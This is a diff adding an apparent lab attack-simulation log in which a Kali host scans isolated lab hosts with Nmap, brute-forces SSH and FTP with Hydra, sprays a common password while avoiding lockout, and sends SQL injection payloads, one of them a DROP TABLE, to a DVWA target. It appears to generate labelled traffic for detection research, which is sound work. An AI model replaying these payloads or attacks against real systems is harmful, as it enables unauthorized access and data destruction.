@@ -1,0 +1,202 @@
+==========================================================
+BATCH FASE LINUX DIMULAI: 2026-10-09 11:50:50 UTC
+==========================================================
+===== MULAI s01-port-scanning @ 11:50:50Z =====
+============================================================
+ S01 | attack_cat=Reconnaissance | phase=any
+ LAB ONLY — jaringan terisolasi, target milik sendiri.
+ Waktu mulai (UTC): 2026-10-09T11:50:51Z
+============================================================
+Target discovery: 10.10.10.10 10.10.10.11 10.10.20.20 10.10.20.21
+[32m>>> START[0m S01 target=10.10.10.10 10.10.10.11 10.10.20.20 10.10.20.21 @ 2026-10-09T11:50:53Z
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-09 11:50 +0000
+Nmap scan report for web01.lab.local (10.10.10.10)
+Host is up (0.0016s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.19 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.25 ((Debian))
+Device type: general purpose
+Running: Linux 4.X
+OS CPE: cpe:/o:linux:linux_kernel:4
+OS details: Linux 4.19 - 5.15
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Nmap scan report for files01.lab.local (10.10.10.11)
+Host is up (0.0013s latency).
+Not shown: 996 closed tcp ports (reset)
+PORT    STATE SERVICE     VERSION
+21/tcp  open  ftp         vsftpd 3.0.5
+22/tcp  open  ssh         OpenSSH 10.0p2 Debian 7+deb13u4 (protocol 2.0)
+139/tcp open  netbios-ssn Samba smbd 4
+445/tcp open  netbios-ssn Samba smbd 4
+Aggressive OS guesses: Linux 4.19 - 5.15 (96%), Linux 6.1 (93%), Nvidia Shield TV (Android 11, Linux 4.9) (92%), Linux 2.6.32 (92%), Linux 3.11 - 4.9 (92%), Linux 3.2 - 3.8 (92%), Linux 4.0 - 4.4 (92%), Linux 4.15 (92%), Linux 5.4 (92%), IPFire 2.27 (Linux 5.15 - 6.1) (92%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Nmap scan report for client1.lab.local (10.10.20.20)
+Host is up (0.0013s latency).
+Not shown: 999 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 10.0p2 Debian 7+deb13u4 (protocol 2.0)
+Aggressive OS guesses: Linux 4.19 - 5.15 (96%), Linux 6.1 (93%), Nvidia Shield TV (Android 11, Linux 4.9) (92%), Linux 2.6.32 (92%), Linux 3.11 - 4.9 (92%), Linux 3.2 - 3.8 (92%), Linux 4.0 - 4.4 (92%), Linux 4.15 (92%), Linux 5.4 (92%), IPFire 2.27 (Linux 5.15 - 6.1) (92%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Nmap scan report for client2.lab.local (10.10.20.21)
+Host is up (0.0013s latency).
+Not shown: 999 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 10.0p2 Debian 7+deb13u4 (protocol 2.0)
+Aggressive OS guesses: Linux 4.19 - 5.15 (96%), Linux 6.1 (93%), Nvidia Shield TV (Android 11, Linux 4.9) (92%), Linux 2.6.32 (92%), Linux 2.6.32 or 3.10 (92%), Linux 3.11 - 4.9 (92%), Linux 3.2 - 3.8 (92%), Linux 4.0 - 4.4 (92%), Linux 4.15 (92%), IPFire 2.27 (Linux 5.15 - 6.1) (92%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 4 IP addresses (4 hosts up) scanned in 27.89 seconds
+   ...jeda 5s (pemisah window)
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-09 11:51 +0000
+Warning: 10.10.20.20 giving up on port because retransmission cap hit (6).
+Warning: 10.10.20.21 giving up on port because retransmission cap hit (6).
+Warning: 10.10.10.11 giving up on port because retransmission cap hit (6).
+Warning: 10.10.10.10 giving up on port because retransmission cap hit (6).
+Nmap scan report for web01.lab.local (10.10.10.10)
+Host is up (0.0018s latency).
+Not shown: 37 closed udp ports (port-unreach)
+PORT      STATE         SERVICE
+123/udp   open|filtered ntp
+138/udp   open|filtered netbios-dgm
+161/udp   open|filtered snmp
+514/udp   open|filtered syslog
+518/udp   open|filtered ntalk
+593/udp   open|filtered http-rpc-epmap
+1645/udp  open|filtered radius
+1812/udp  open|filtered radius
+2049/udp  open|filtered nfs
+3456/udp  open|filtered IISrpc-or-vat
+4500/udp  open|filtered nat-t-ike
+49153/udp open|filtered unknown
+49154/udp open|filtered unknown
+
+Nmap scan report for files01.lab.local (10.10.10.11)
+Host is up (0.0023s latency).
+Not shown: 33 closed udp ports (port-unreach)
+PORT      STATE         SERVICE
+53/udp    open|filtered domain
+68/udp    open|filtered dhcpc
+69/udp    open|filtered tftp
+137/udp   open          netbios-ns
+138/udp   open|filtered netbios-dgm
+514/udp   open|filtered syslog
+518/udp   open|filtered ntalk
+626/udp   open|filtered serialnumberd
+631/udp   open|filtered ipp
+996/udp   open|filtered vsinet
+1812/udp  open|filtered radius
+2048/udp  open|filtered dls-monitor
+2222/udp  open|filtered msantipiracy
+3456/udp  open|filtered IISrpc-or-vat
+5060/udp  open|filtered sip
+32768/udp open|filtered omad
+49153/udp open|filtered unknown
+
+Nmap scan report for client1.lab.local (10.10.20.20)
+Host is up (0.0015s latency).
+Not shown: 41 closed udp ports (port-unreach)
+PORT     STATE         SERVICE
+53/udp   open|filtered domain
+68/udp   open|filtered dhcpc
+69/udp   open|filtered tftp
+500/udp  open|filtered isakmp
+514/udp  open|filtered syslog
+518/udp  open|filtered ntalk
+1645/udp open|filtered radius
+2049/udp open|filtered nfs
+5060/udp open|filtered sip
+
+Nmap scan report for client2.lab.local (10.10.20.21)
+Host is up (0.0018s latency).
+Not shown: 44 closed udp ports (port-unreach)
+PORT     STATE         SERVICE
+139/udp  open|filtered netbios-ssn
+500/udp  open|filtered isakmp
+518/udp  open|filtered ntalk
+1645/udp open|filtered radius
+3456/udp open|filtered IISrpc-or-vat
+5060/udp open|filtered sip
+
+Nmap done: 4 IP addresses (4 hosts up) scanned in 42.41 seconds
+[32m<<< END[0m   S01 @ 2026-10-09T11:52:08Z  (marker -> /home/kali/attack-markers.csv)
+Output: s01-tcp.nmap, s01-udp.nmap
+===== SELESAI s01-port-scanning (rc=0) @ 11:52:08Z — jeda 5 menit =====
+===== MULAI s02-bruteforce-ssh-ftp @ 11:57:08Z =====
+============================================================
+ S02 | attack_cat=Brute Force | phase=any
+ LAB ONLY — jaringan terisolasi, target milik sendiri.
+ Waktu mulai (UTC): 2026-10-09T11:57:09Z
+============================================================
+[32m>>> START[0m S02 target=10.10.10.11 @ 2026-10-09T11:57:09Z
+== SSH brute ==
+Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-10-09 11:57:10
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 80 login tries (l:8/p:10), ~20 tries per task
+[DATA] attacking ssh://10.10.10.11:22/
+[22][ssh] host: 10.10.10.11   misc: (null)   login: labadmin   password: labadmin
+[STATUS] attack finished for 10.10.10.11 (valid pair found)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-10-09 11:57:10
+   ...jeda 5s (pemisah window)
+== FTP brute ==
+Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-10-09 11:57:15
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 80 login tries (l:8/p:10), ~20 tries per task
+[DATA] attacking ftp://10.10.10.11:21/
+[21][ftp] host: 10.10.10.11   misc: (null)   login: labadmin   password: labadmin
+[STATUS] attack finished for 10.10.10.11 (valid pair found)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-10-09 11:57:17
+[32m<<< END[0m   S02 @ 2026-10-09T11:57:17Z  (marker -> /home/kali/attack-markers.csv)
+Output: s02-ssh.hydra, s02-ftp.hydra
+===== SELESAI s02-bruteforce-ssh-ftp (rc=0) @ 11:57:17Z — jeda 5 menit =====
+===== MULAI s03-password-spraying @ 12:02:17Z =====
+============================================================
+ S03 | attack_cat=Brute Force | phase=linux-or-windows
+ LAB ONLY — jaringan terisolasi, target milik sendiri.
+ Waktu mulai (UTC): 2026-10-09T12:02:17Z
+============================================================
+Spray password: P@ssw0rd123  (-t 1 -W 5 = lambat, hindari lockout)
+[32m>>> START[0m S03 target=spray @ 2026-10-09T12:02:17Z
+== spray SSH 10.10.10.11 ==
+Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-10-09 12:02:18
+[DATA] max 1 task per 1 server, overall 1 task, 8 login tries (l:8/p:1), ~8 tries per task
+[DATA] attacking ssh://10.10.10.11:22/
+[STATUS] 8.00 tries/min, 8 tries in 00:01h, 1 to do in 00:01h, 1 active
+1 of 1 target completed, 0 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-10-09 12:03:20
+[32m<<< END[0m   S03 @ 2026-10-09T12:03:22Z  (marker -> /home/kali/attack-markers.csv)
+Output: s03-ssh.hydra (+ s03-smb.nxc, s03-rdp.hydra jika Windows phase)
+===== SELESAI s03-password-spraying (rc=0) @ 12:03:22Z — jeda 5 menit =====
+===== MULAI s04-web-injection-sqli @ 12:08:23Z =====
+============================================================
+ S04 | attack_cat=Exploits | phase=any
+ LAB ONLY — jaringan terisolasi, target milik sendiri.
+ Waktu mulai (UTC): 2026-10-09T12:08:23Z
+============================================================
+[32m>>> START[0m S04 target=10.10.10.10 @ 2026-10-09T12:08:23Z
+DVWA_COOKIE kosong -> burst payload manual via curl (tetap trafik SQLi).
+  sent[302]: 1' OR '1'='1
+  sent[302]: 1' UNION SELECT user,password FROM users-- -
+  sent[302]: 1'; DROP TABLE x-- -
+  sent[302]: 1' AND SLEEP(3)-- -
+  sent[302]: 1' OR 1=1#
+  cmdi sent[302]
+[32m<<< END[0m   S04 @ 2026-10-09T12:08:29Z  (marker -> /home/kali/attack-markers.csv)
+===== SELESAI s04-web-injection-sqli (rc=0) @ 12:08:29Z — jeda 5 menit =====
